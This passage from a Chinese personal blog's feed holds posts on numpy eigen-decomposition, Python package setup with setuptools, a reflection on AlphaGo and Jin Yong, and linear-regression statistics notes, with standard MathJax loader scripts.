    &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;permutation&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;N&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;I&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3 id="eigen-decomposition"&gt;&lt;a name="user-content-eigen-decomposition" href="#eigen-decomposition" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;特征分解（eigen decomposition）&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;np.eigh&lt;/code&gt; 针对对称的矩阵， &lt;strong&gt;注意， eigenvalues 是升序的，而在R语言里面是降序的！&lt;/strong&gt;&lt;br /&gt;
&lt;code&gt;np.eig&lt;/code&gt; 普通的分解， eigenvalues不保证顺序。  &lt;/p&gt;
&lt;script type="text/javascript"&gt;if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) {
    var align = "left",
        indent = "0em",
        linebreak = "false";

    if (true) {
        align = (screen.width &lt; 768) ? "left" : align;
        indent = (screen.width &lt; 768) ? "0em" : indent;
        linebreak = (screen.width &lt; 768) ? 'true' : linebreak;
    }

    var mathjaxscript = document.createElement('script');
    var location_protocol = (false) ? 'https' : document.location.protocol;
    if (location_protocol !== 'http' &amp;&amp; location_protocol !== 'https') location_protocol = 'https:';
    mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#';
    mathjaxscript.type = 'text/javascript';
    mathjaxscript.src = location_protocol + '//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML';
    mathjaxscript[(window.opera ? "innerHTML" : "text")] =
        "MathJax.Hub.Config({" +
        "    config: ['MMLorHTML.js']," +
        "    TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'AMS' } }," +
        "    jax: ['input/TeX','input/MathML','output/HTML-CSS']," +
        "    extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js']," +
        "    displayAlign: '"+ align +"'," +
        "    displayIndent: '"+ indent +"'," +
        "    showMathMenu: true," +
        "    messageStyle: 'normal'," +
        "    tex2jax: { " +
        "        inlineMath: [ ['\\\\(','\\\\)'] ], " +
        "        displayMath: [ ['$$','$$'] ]," +
        "        processEscapes: true," +
        "        preview: 'TeX'," +
        "    }, " +
        "    'HTML-CSS': { " +
        "        styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} }," +
        "        linebreaks: { automatic: "+ linebreak +", width: '90% container' }," +
        "    }, " +
        "}); " +
        "if ('default' !== 'default') {" +
            "MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {" +
                "var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;" +
                "VARIANT['normal'].fonts.unshift('MathJax_default');" +
                "VARIANT['bold'].fonts.unshift('MathJax_default-bold');" +
                "VARIANT['italic'].fonts.unshift('MathJax_default-italic');" +
                "VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');" +
            "});" +
            "MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {" +
                "var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;" +
                "VARIANT['normal'].fonts.unshift('MathJax_default');" +
                "VARIANT['bold'].fonts.unshift('MathJax_default-bold');" +
                "VARIANT['italic'].fonts.unshift('MathJax_default-italic');" +
                "VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');" +
            "});" +
        "}";
    (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript);
}
&lt;/script&gt;</summary><category term="numpy"></category><category term="python"></category><category term="小结"></category></entry><entry><title>Python Package Setup</title><link href="http://littlezz.github.io/python-package-setup.html" rel="alternate"></link><updated>2016-03-17T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-03-17:python-package-setup.html</id><summary type="html">&lt;p&gt;esl_model &lt;a href="https://github.com/littlezz/ESL-Model"&gt;https://github.com/littlezz/ESL-Model&lt;/a&gt;&lt;br /&gt;
今天算是弄完了第三章的代码， 放到github上面， 折腾python的打包折腾了大半天。  &lt;/p&gt;
&lt;p&gt;简单总结一下Python的Package Distribution吧。&lt;br /&gt;
有空的话， 在写一个pytest的简单总结。&lt;/p&gt;
&lt;h2 id="setuppy"&gt;&lt;a name="user-content-setuppy" href="#setuppy" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;setup.py&lt;/h2&gt;
&lt;p&gt;setup.py 是最主要的整个配置的文件， &lt;/p&gt;
&lt;p&gt;贴我的setup.py 的代码好了。  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;setuptools&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;setup&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;find_packages&lt;/span&gt;

&lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;README.rst&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;encoding&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;readme&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="n"&gt;version&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;__import__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;esl_model&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__version__&lt;/span&gt;


&lt;span class="n"&gt;setup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;esl_model&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="n"&gt;version&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;version&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="n"&gt;description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Algorithm from The Elements of Statistical Learning book implement by Python code&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="n"&gt;long_description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;readme&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="n"&gt;classifiers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;
          &lt;span class="s1"&gt;&amp;#39;Programming Language :: Python :: 3.5&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="s1"&gt;&amp;#39;Programming Language :: Python :: 3 :: Only&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="s1"&gt;&amp;#39;Development Status :: 2 - Pre-Alpha&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="s1"&gt;&amp;#39;License :: OSI Approved :: MIT License&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="p"&gt;],&lt;/span&gt;
      &lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;https://github.com/littlezz/ESL-Model&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="n"&gt;author&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;littlezz&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="n"&gt;author_email&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;zz.at.field@gmail.com&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="n"&gt;license&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;MIT&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="n"&gt;packages&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;find_packages&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;exclude&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;tests*&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]),&lt;/span&gt;
      &lt;span class="n"&gt;install_requires&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;
            &lt;span class="s1"&gt;&amp;#39;numpy&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="s1"&gt;&amp;#39;pandas&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="s1"&gt;&amp;#39;scipy&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="s1"&gt;&amp;#39;sklearn&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="p"&gt;],&lt;/span&gt;
      &lt;span class="n"&gt;tests_require&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;pytest&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
      &lt;span class="n"&gt;include_package_data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="n"&gt;zip_safe&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;逐个解释参数。&lt;br /&gt;
&lt;code&gt;name&lt;/code&gt; 是你要发布的模块的名字, 只能是用小写和下划线.不要和其他的公共的模块名字冲突.  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;version&lt;/code&gt; 是版本号, 诸如 0.0.1 这样.  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;description&lt;/code&gt; 和 &lt;code&gt;long_description&lt;/code&gt;是你这个项目的介绍，用于pipy上面的介绍，注意 long_description 只能使用rst格式， **不支持**markdown。   &lt;/p&gt;
&lt;p&gt;&lt;code&gt;classifiers&lt;/code&gt;是你在pipy上面的分类， 一般在这里要只能你是否支持py2， 或py3， 或者是否有特定的平台限制。&lt;a href="https://pypi.python.org/pypi?%3Aaction=list_classifiers"&gt;所有classifiers 列表&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;packages&lt;/code&gt;, 要包含的代码的文件夹。比如我也可以设置成 &lt;code&gt;esl_model&lt;/code&gt;， 但是据我观察， 这样设置之后， 我下面的子模块是没有办法使用&lt;code&gt;import esl_model.ch3&lt;/code&gt; 这样载入的。&lt;br /&gt;
所以使用find_packages自动寻找所有模块， 特别排除我的测试文件存放的文件夹。  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;install_requires&lt;/code&gt;, 依赖， 如果在虚拟环境里面的话可以用&lt;code&gt;pip freeze&lt;/code&gt;来查看安装的库， 但是这里面会包含真正用到的库（比如里面可能会显示ipython）。 可以使用 pipreqs 这个库。  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;tests_require&lt;/code&gt; 这个是测试的用的, 在&lt;code&gt;python setup.py test&lt;/code&gt;的时候用到, 然而我偷懒了, pytest在这里还差一步配置， 所以这里有没有都一样。。  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;include_package_data&lt;/code&gt;, 这个是包含非python代码的文件， 我的程序里面要使用到csv数据， 所以需要这个选项。  &lt;/p&gt;
&lt;p&gt;我的代码结构树&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;── LICENSE.md
├── MANIFEST.in
├── README.rst
├── esl_model
│   ├── __init__.py
│   ├── __pycache__
│   ├── base.py
│   ├── ch3
│   │   ├── __init__.py
│   │   ├── __pycache__
│   │   └── model.py
│   ├── datasets
│   │   ├── __init__.py
│   │   ├── __pycache__
│   │   ├── base.py
│   │   └── data
│   │       └── prostate.csv
│   └── utils.py
├── pytest.ini
├── setup.py
└── tests
    ├── __init__.py
    ├── __pycache__
    ├── test_ch3.py
    └── utils.py
&lt;/pre&gt;&lt;/div&gt;


&lt;h2 id="manifestin"&gt;&lt;a name="user-content-manifestin" href="#manifestin" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;MANIFEST.in&lt;/h2&gt;
&lt;p&gt;指定需要包含的非程序文件  &lt;/p&gt;
&lt;p&gt;一般是&lt;code&gt;include README.rst&lt;/code&gt; &lt;br /&gt;
我这里因为有额外的数据， 所以要多一行。  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;include README.rst
recursive-include esl_model/datasets/data *.csv
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;recursive-include 必须， 不然数据不包含。  &lt;/p&gt;
&lt;h2 id="_1"&gt;&lt;a name="user-content-_1" href="#_1" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;测试安装&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;pip install -e .&lt;/code&gt;&lt;br /&gt;
本地的调试安装模式。  &lt;/p&gt;
&lt;h2 id="ref"&gt;&lt;a name="user-content-ref" href="#ref" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;ref&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;sklearn的配置文件 &lt;a href="https://github.com/scikit-learn/scikit-learn"&gt;https://github.com/scikit-learn/scikit-learn&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Python-packaging &lt;a href="https://python-packaging.readthedocs.org/en/latest/testing.html"&gt;https://python-packaging.readthedocs.org/en/latest/testing.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</summary><category term="python"></category><category term="小结"></category></entry><entry><title>阿发狗，少年以及金庸</title><link href="http://littlezz.github.io/a-fa-gou-shao-nian-yi-ji-jin-yong.html" rel="alternate"></link><updated>2016-03-15T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-03-15:a-fa-gou-shao-nian-yi-ji-jin-yong.html</id><summary type="html">&lt;p&gt;阿发狗3：0打赢了李世石， 整个世界沉浸在一股人工智能毁灭人类的狂欢中， 之后李世石翻了一盘。 众人笑道：AI已经学会放水啦， 药丸药丸， 真是可怕。  &lt;/p&gt;
&lt;p&gt;时至围棋界被阿发狗颠覆之际， 世界围棋第一人站了出来：就算阿发狗能打败李世石， 也打败不了我！大家定睛一看， 发现围棋第一人是个19岁少年， 于是纷纷以长辈自称， 要教他一下如何做人谦虚的人生道理。  &lt;/p&gt;
&lt;p&gt;围棋大师吴清源的脑残粉金庸同学3月10日九十二岁啦， 大家有什么想对他说的， 截止2016年03月16日00:44:36， 这个问题下面排名第一的答案写了一个小故事， 大意是金庸因为写了一篇暗讽教务主任的文章被其看到后居然就被退学了， 之后金庸都不提这段高中历史， 作者给于这件事情的评价是， 『傲娇』得很的金庸。末尾不忘用一个感叹号来增强语气。  &lt;/p&gt;
&lt;p&gt;我想起了周杰伦在《三年二班》里面唱到那句重复了好多遍的歌词  &lt;/p&gt;
&lt;p&gt;——  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;不好笑 不好笑 不好笑 不好笑 不好笑 不好笑 不好笑 不好笑 不好笑 不好笑 不好笑 不好笑 不好笑 不好笑 不好笑 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这三件事情， 一点也不好笑。  &lt;/p&gt;
&lt;p&gt;如果你也曾在出发时志在必得， 结果却被打得落花流水， 咬紧牙关取得一些成绩却于事无补。  &lt;/p&gt;
&lt;p&gt;如果你也曾在同辈愉快玩耍的时候承受超越『年龄段』的磨练， 以此获得相应的能力， 却还是要被年长而无能者打着人生经验丰富的旗号『教育』一番。  &lt;/p&gt;
&lt;p&gt;如果你也曾空怀与学校教学目标不相符的能力， 而濒临退学， 抑或被直接退学。  &lt;/p&gt;
&lt;p&gt;那么， 你就会知道， 一点也不好笑。  &lt;/p&gt;
&lt;p&gt;&lt;/br&gt;&lt;/p&gt;
&lt;p&gt;三面的三件事， 其实都可以围绕围棋展开， 第一件事李世石困兽之斗， 基本上线上和线下的人都开玩笑说是AI放水， 对之前不可一世的李世石同学的嘲讽程度可见一斑。&lt;br /&gt;
第二件事是19岁少年的『惊人』发言， 于是大家想要教他当大人。&lt;/p&gt;
&lt;p&gt;然而这些举动其实在我们的吴清源大师面前， 其实都是小儿科。&lt;br /&gt;
不过， 大家也不关心吴清源是谁是不是？  &lt;/p&gt;
&lt;p&gt;算了， 本来我还有半肚子的苦水没有得喷出来， 写到这里的时候也没有什么想说的了， 以前老是奇怪， 你说那些动物长得都一样的， 他们怎么分得清楚谁是谁？  &lt;/p&gt;
&lt;p&gt;我们分不清，但是他们分得清啊。 现在想来网络上也是一样的。&lt;br /&gt;
隔着屏幕， 谁知道后面码字的谁是谁， 在这里被恶心完之后， 接着被下一个地方恶心， 我们总用一个『傻x』来标记他们， 结果发现这个世界上怎么这么多『傻x』， 然而仔细一想， 这个词后面是无数的人， 你干掉了一个， 又冒出一个，无穷尽，辩不赢， 赢不长久， 赢了也没用。最后哪怕是呕心沥血的赢了一次，花了时间和精力， 最后得到对面甘拜下风， 低头认输， 五体投地，结果过了不久又冒出一个。  &lt;/p&gt;
&lt;p&gt;所以当我发现我要写一些幼稚得不行的所谓的人生道理的时候， 我及时的把自己打住了。  &lt;/p&gt;
&lt;p&gt;有非常多的话要说， 但是在写作的时候， 我已经在自己的内心里面说了一遍， 这就够了。  &lt;/p&gt;
&lt;p&gt;如果有过一些相似的经历， 那么有些话是不必多说的， 如果没有过切身体会， 那么又何必多说？  &lt;/p&gt;
&lt;p&gt;2016年03月16日01:58:35  &lt;/p&gt;</summary><category term="瞎扯"></category><category term="日记"></category></entry><entry><title>Linear Model的总结</title><link href="http://littlezz.github.io/linear-modelde-zong-jie.html" rel="alternate"></link><updated>2016-03-10T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-03-10:linear-modelde-zong-jie.html</id><summary type="html">&lt;h2 id="_1"&gt;&lt;a name="user-content-_1" href="#_1" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;目录&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;公式&lt;/li&gt;
&lt;li&gt;易混淆的名词解释&lt;/li&gt;
&lt;li&gt;蛋疼的程序编写过程  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="_2"&gt;&lt;a name="user-content-_2" href="#_2" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;公式&lt;/h3&gt;
&lt;p&gt;The elements of statistical learning 看到了第三章， 昨天着手于编写程序。  &lt;/p&gt;
&lt;p&gt;Linear Model: &lt;/p&gt;
&lt;p&gt;&lt;span class="math"&gt;\(\hat\beta = (\mathbf X^T \mathbf X)^{-1} \mathbf X^T \mathbf y\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;在这里面， &lt;span class="math"&gt;\(\mathbf X\)&lt;/span&gt; 先要要standardization, 然后在第一列插入全为1的列， 用于截距计算(intercept)。&lt;br /&gt;
所以beta hat 算出来后第一项为截距。  &lt;/p&gt;
&lt;p&gt;&lt;span class="math"&gt;\(\hat {\mathbf y} = \mathbf X \hat \beta\)&lt;/span&gt; &lt;/p&gt;
&lt;p&gt;对数据做预测的时候， &lt;strong&gt;X也要standardization&lt;/strong&gt;， 做和你之前一样的事情， 使用和**train set一样的 mean 和 std**， 说多了都是泪啊， 我昨天晚上一个晚上都在弄这个， 因为我的要预测的x用了自己的mean 和std， 结果出来的结果不一样。  一定要使用相同的std 和mean 来处理数据。 我才想起来ng的课里面写程序的时候， pdf里面还特别提示过， 妈的， 哭晕。  &lt;/p&gt;
&lt;p&gt;&lt;span class="math"&gt;\(var(\hat\beta)=(\mathbf X^T \mathbf X)^{-1}\sigma^2\)&lt;/span&gt;  &lt;/p&gt;
&lt;p&gt;&lt;span class="math"&gt;\(\hat \sigma = \frac{1}{N-p-1} \sum_{i=1}^N(y_i - \hat y_i)^2\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;然后是z-score&lt;br /&gt;
&lt;span class="math"&gt;\(z_j = \frac{\hat\beta_j}{\hat \sigma \sqrt v_j}\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;注意到&lt;span class="math"&gt;\(v_j\)&lt;/span&gt;是&lt;span class="math"&gt;\(\mathbf X^T \mathbf X\)&lt;/span&gt;的对角线上的第j项。&lt;br /&gt;
所以得到stand error这里的做法是对&lt;span class="math"&gt;\(var(\hat\beta)\)&lt;/span&gt;对角线开平方。&lt;/p&gt;
&lt;p&gt;F statistic  &lt;/p&gt;
&lt;p&gt;&lt;span class="math"&gt;\(F = \frac{(RSS_0 - RSS_1)/(p_1 - p_0)}{RSS1 / (N - p_1 - 1)}\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;F statistic 用于分析去掉一些feature之后影响大不大。&lt;br /&gt;
&lt;span class="math"&gt;\(RSS_1\)&lt;/span&gt; 是含有跟多feature的模型的代价， &lt;span class="math"&gt;\(RSS_0\)&lt;/span&gt;是去掉一些feature之后的模型的代价。  &lt;/p&gt;
&lt;h3 id="_3"&gt;&lt;a name="user-content-_3" href="#_3" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;易混淆的名词解释&lt;/h3&gt;
&lt;h5 id="standardization"&gt;&lt;a name="user-content-standardization" href="#standardization" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;standardization&lt;/h5&gt;
&lt;p&gt;这个的意识是让数据的feature 的平均值为0, 然后高斯分布为1.  &lt;/p&gt;
&lt;p&gt;针对的是每一个feature, 一般是&lt;code&gt;x = (x-x.mean(axis=0)) / x.std(asix=0, ddof=1)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;默认ddof=0， 这个时候标准差（std） 是除以N的， 在机器学习里面， 一般是除以N， 但是在这本书里面， 一般是认为std的计算要除以（N-1）。  &lt;/p&gt;
&lt;h5 id="normalize"&gt;&lt;a name="user-content-normalize" href="#normalize" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;normalize&lt;/h5&gt;
&lt;p&gt;这个是针对每一个样例的， 比如X里面包含N组数据， 那么就是对N组数据做， 一般是把不同特征的取值范围降到同一个范围里面。  &lt;/p&gt;
&lt;h3 id="_4"&gt;&lt;a name="user-content-_4" href="#_4" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;蛋疼的程序编写过程&lt;/h3&gt;
&lt;p&gt;我花了一天， 才发现， standardization对结果是不会影响的， 是一种优化方法。&lt;br /&gt;
但是我因为对 Test_X 的数据standardization错了, 所以结果总是不一样. 非常的尴尬.  &lt;/p&gt;
&lt;p&gt;翻了sklearn的源码, 发现他里面怎么对y做了处理, 做了&lt;code&gt;(y-y.mean())&lt;/code&gt;东西， 卧槽， 不合理啊。  &lt;/p&gt;
&lt;p&gt;昨天写了一天， 值写了linear Regression， 后面还有一堆， 慢慢写吧。  &lt;/p&gt;
&lt;p&gt;等稳定一些之后再放到github上面好了。  &lt;/p&gt;
&lt;p&gt;2016年03月10日15:12:10&lt;/p&gt;
&lt;script type="text/javascript"&gt;if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) {
    var align = "left",
        indent = "0em",
        linebreak = "false";

    if (true) {
        align = (screen.width &lt; 768) ? "left" : align;
        indent = (screen.width &lt; 768) ? "0em" : indent;
        linebreak = (screen.width &lt; 768) ? 'true' : linebreak;
    }

    var mathjaxscript = document.createElement('script');
    var location_protocol = (false) ? 'https' : document.location.protocol;
    if (location_protocol !== 'http' &amp;&amp; location_protocol !== 'https') location_protocol = 'https:';
    mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#';
    mathjaxscript.type = 'text/javascript';
    mathjaxscript.src = location_protocol + '//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML';
    mathjaxscript[(window.opera ? "innerHTML" : "text")] =
        "MathJax.Hub.Config({" +
        "    config: ['MMLorHTML.js']," +
        "    TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'AMS' } }," +
        "    jax: ['input/TeX','input/MathML','output/HTML-CSS']," +
        "    extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js']," +
        "    displayAlign: '"+ align +"'," +
        "    displayIndent: '"+ indent +"'," +
        "    showMathMenu: true," +
        "    messageStyle: 'normal'," +
        "    tex2jax: { " +
        "        inlineMath: [ ['\\\\(','\\\\)'] ], " +
        "        displayMath: [ ['$$','$$'] ]," +
        "        processEscapes: true," +
        "        preview: 'TeX'," +
        "    }, " +
        "    'HTML-CSS': { " +
        "        styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} }," +
        "        linebreaks: { automatic: "+ linebreak +", width: '90% container' }," +
        "    }, " +
        "}); " +
        "if ('default' !== 'default') {" +
            "MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {" +
                "var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;" +
                "VARIANT['normal'].fonts.unshift('MathJax_default');" +
                "VARIANT['bold'].fonts.unshift('MathJax_default-bold');" +
                "VARIANT['italic'].fonts.unshift('MathJax_default-italic');" +
                "VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');" +
            "});" +
            "MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {" +
                "var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;" +
                "VARIANT['normal'].fonts.unshift('MathJax_default');" +
                "VARIANT['bold'].fonts.unshift('MathJax_default-bold');" +
                "VARIANT['italic'].fonts.unshift('MathJax_default-italic');" +
                "VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');" +
            "});" +
        "}";
    (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript);
}
&lt;/script&gt;</summary><category term="机器学习"></category></entry><entry><title>概率论学习</title><link href="http://littlezz.github.io/gai-lu-lun-xue-xi.html" rel="alternate"></link><updated>2016-01-29T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-01-29:gai-lu-lun-xue-xi.html</id><summary type="html">&lt;p&gt;所用公式都是用mathjax 写的， ( &lt;del&gt;奶奶的， 写死我了。&lt;/del&gt; )  &lt;/p&gt;
&lt;h2 id="_1"&gt;&lt;a name="user-content-_1" href="#_1" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;基本概念&lt;/h2&gt;
&lt;p&gt;基本概念主要记下常用公式。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;P(A) 表示事件A发生的概率  &lt;/li&gt;
